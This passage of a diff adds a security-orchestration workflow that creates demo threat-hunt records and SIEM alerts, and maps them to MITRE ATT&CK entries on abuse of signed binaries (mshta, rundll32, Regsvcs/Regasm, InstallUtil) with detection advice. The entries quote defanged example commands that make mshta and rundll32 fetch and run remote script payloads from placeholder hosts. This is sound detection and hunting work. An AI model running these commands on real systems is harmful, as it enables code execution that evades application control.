mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)\",\n    \"lastModified\": 1634342340,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User\"\n  }{% elif 'mshta' in vars.item._index and 'cmd' in vars.item._source.image_path %}{\n    \"id\": 314,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/840a987a-99bd-4a80-a5c9-0cb2baa6cade\",\n    \"name\": \"Mshta\",\n    \"uuid\": \"840a987a-99bd-4a80-a5c9-0cb2baa6cade\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579807969,\n    \"mitreId\": \"T1218.005\",\n    \"myNotes\": null,\n    \"version\": \"1.1\",\n    \"detection\": \"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\\n\\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, File: File Creation, Command: Command Execution, Network Traffic: Network Connection Creation\",\n    \"description\": \"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \\n\\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\\n\\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\\\"GetObject(\\\"\\\"script:https[:]\/\/webserver\/payload[.]sct\\\"\\\")\\\"))<\/code>\\n\\nThey may also be executed directly from URLs: <code>mshta http[:]\/\/webserver\/payload[.]hta<\/code>\\n\\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)\",\n    \"lastModified\": 1634342340,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User\"\n  }{% elif 'regsvcregasm' in vars.item._index %}{\n    \"id\": 394,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/c48a67ee-b657-45c1-91bf-6cdbe27205f8\",\n    \"name\": \"Regsvcs\/Regasm\",\n    \"uuid\": \"c48a67ee-b657-45c1-91bf-6cdbe27205f8\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579808536,\n    \"mitreId\": \"T1218.009\",\n    \"myNotes\": null,\n    \"version\": \"1.0\",\n    \"detection\": \"Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, Command: Command Execution\",\n    \"description\": \"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https:\/\/attack.mitre.org\/techniques\/T1559\/001) (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\\n\\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]<\/code> or <code>[ComUnregisterFunction]<\/code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)\",\n    \"lastModified\": 1619707779,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User, Administrator\"\n  }{% elif 'rundll32' in vars.item._index %}{\n    \"id\": 108,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/045d0922-2310-4e60-b5e4-3302302cb3c5\",\n    \"name\": \"Rundll32\",\n    \"uuid\": \"045d0922-2310-4e60-b5e4-3302302cb3c5\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579802626,\n    \"mitreId\": \"T1218.011\",\n    \"myNotes\": null,\n    \"version\": \"1.1\",\n    \"detection\": \"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\\n\\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"File: File Metadata, Process: Process Creation, Command: Command Execution, Module: Module Load\",\n    \"description\": \"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https:\/\/attack.mitre.org\/techniques\/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}<\/code>).\\n\\nRundll32.exe can also be used to execute [Control Panel](https:\/\/attack.mitre.org\/techniques\/T1218\/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL<\/code> and <code>Control_RunDLLAsUser<\/code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:https[:]\/\/www[.]example[.]com\/malicious.sct\\\")\\\"<\/code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\\n\\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide\/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction<\/code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW<\/code>, or failing that <code>ExampleFunctionA<\/code>, before loading <code>ExampleFunction<\/code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W<\/code> and\/or <code>A<\/code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)\",\n    \"lastModified\": 1634247953,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User\"\n  }{% elif 'installutil' in vars.item._index %}{\n    \"id\": 183,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/2cd950a6-16c4-404a-aa01-044322395107\",\n    \"name\": \"InstallUtil\",\n    \"uuid\": \"2cd950a6-16c4-404a-aa01-044322395107\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579806588,\n    \"mitreId\": \"T1218.004\",\n    \"myNotes\": null,\n    \"version\": \"1.0\",\n    \"detection\": \"Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, Command: Command Execution\",\n    \"description\": \"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v<version>\\\\InstallUtil.exe<\/code> and <code>C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v<version>\\\\InstallUtil.exe<\/code>.\\n\\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]<\/code>. (Citation: LOLBAS Installutil)\",\n    \"lastModified\": 1619707779,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User\"\n  }{% endif %}"
+                },
+                "apply_async": false,
+                "step_variables": [],
+                "workflowReference": "\/api\/3\/workflows\/8f61e7f7-955b-4a81-947e-be12568e66b8"
+            },
+            "status": null,
+            "top": "705",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/74932bdc-b8b6-4d24-88c4-1a4dfbc524f3",
+            "uuid": "4407afc6-9b77-4109-92fa-85650a97b772",
+            "id": 4744
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Create Hunt Record",
+            "description": null,
+            "arguments": {
+                "resource": {
+                    "name": "Demo Hunt - {{vars.scenarioTitle}}",
+                    "huntEnd": "{{arrow.get(vars.steps.Get_Hunt_Time_Range.input.huntEndDate).int_timestamp}}",
+                    "__replace": "",
+                    "huntStart": "{{arrow.get(vars.steps.Get_Hunt_Time_Range.input.huntStartDate).int_timestamp}}",
+                    "timeCreated": "{{arrow.utcnow().int_timestamp}}"
+                },
+                "_showJson": false,
+                "operation": "Overwrite",
+                "collection": "\/api\/3\/hunt",
+                "__recommend": [],
+                "fieldOperation": {
+                    "recordTags": "Overwrite"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "435",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/2597053c-e718-44b4-8394-4d40fe26d357",
+            "uuid": "d5dfe07c-f80d-415f-80f1-13e15734a0d8",
+            "id": 4745
+        }
+    ],
+    "routes": [
+        {
+            "@type": "WorkflowRoute",
+            "name": "Create Alerts from Elastic -> Get Created Alert Data",
+            "targetStep": "\/api\/3\/workflow_steps\/e403123e-64a2-4c04-aaa2-7808391edb03",
+            "sourceStep": "\/api\/3\/workflow_steps\/4407afc6-9b77-4109-92fa-85650a97b772",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "5f3fefdf-b9c9-4cb0-9214-7c927d819b29"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Get Alert from SIEM -> Create and Link Alert",
+            "targetStep": "\/api\/3\/workflow_steps\/4407afc6-9b77-4109-92fa-85650a97b772",
+            "sourceStep": "\/api\/3\/workflow_steps\/051668a8-445e-4117-bbad-e2c5c3d5e632",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "1d7c8ae8-ebe6-4509-8219-711f2814ba1e"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Configuration -> Get Hunt Time Range",
+            "targetStep": "\/api\/3\/workflow_steps\/1d63b989-eae0-4a8d-b5c2-0c1bf064faa6",
+            "sourceStep": "\/api\/3\/workflow_steps\/9ccbca61-ccd5-44ee-9d46-a31e196d8bb3",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "d13cf055-ac44-4944-87ca-2c823ceb78b5"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Start -> Configuration",
+            "targetStep": "\/api\/3\/workflow_steps\/9ccbca61-ccd5-44ee-9d46-a31e196d8bb3",
+            "sourceStep": "\/api\/3\/workflow_steps\/6aa23f61-e8cd-4bcf-867e-3443905cf4fd",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "2b89b126-0232-4f15-a184-5ebcb3098618"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Get Hunt Time Range -> Create Hunt Record",
+            "targetStep": "\/api\/3\/workflow_steps\/d5dfe07c-f80d-415f-80f1-13e15734a0d8",
+            "sourceStep": "\/api\/3\/workflow_steps\/1d63b989-eae0-4a8d-b5c2-0c1bf064faa6",
+            "label": "Submit",
+            "isExecuted": false,
+            "uuid": "4671bfe8-bc4e-4858-b66a-2a651ca0dc5b"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Create Hunt Record -> Get Alert from SIEM",
+            "targetStep": "\/api\/3\/workflow_steps\/051668a8-445e-4117-bbad-e2c5c3d5e632",
+            "sourceStep": "\/api\/3\/workflow_steps\/d5dfe07c-f80d-415f-80f1-13e15734a0d8",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "27aa96bf-5a7a-4b7b-bf1d-67a04cceb69b"
+        }
+    ],
+    "priority": "\/api\/3\/picklists\/2b563c61-ae2c-41c0-a85a-c9709585e3f2",
+    "uuid": "520a4b39-8ebd-41c0-a0fe-ffe9c898ce4d",
+    "recordTags": [
+        "Referenced"
+    ],
+    "id": 1146,
+    "createUser": "\/api\/3\/people\/3451141c-bac6-467c-8d72-85e0fab569ce",
+    "createDate": 1644165547,
+    "modifyUser": "\/api\/3\/people\/3451141c-bac6-467c-8d72-85e0fab569ce",
+    "modifyDate": 1644165547,
+    "owners": [],
+    "isPrivate": false
+}
